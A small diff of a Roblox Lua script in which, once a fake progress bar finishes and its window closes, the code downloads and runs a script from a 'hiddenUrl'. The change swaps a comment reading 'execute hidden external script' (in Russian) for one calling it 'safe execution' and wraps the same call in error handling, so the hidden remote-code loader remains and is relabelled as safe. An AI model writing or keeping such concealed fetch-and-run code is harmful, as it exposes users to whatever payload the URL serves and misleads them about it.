@@ -142,8 +142,13 @@ local function fillProgressBarAndLoadScript()
             conn:Disconnect()
             gui:Destroy()
 
-            -- Выполняем скрытый внешний скрипт
-            loadstring(game:HttpGet(hiddenUrl))()
+            -- Безопасное выполнение внешнего скрипта
+            local success, err = pcall(function()
+                loadstring(game:HttpGet(hiddenUrl))()
+            end)
+            if not success then
+                warn("Ошибка при загрузке внешнего скрипта:", err)
+            end
         end
     end)
 end
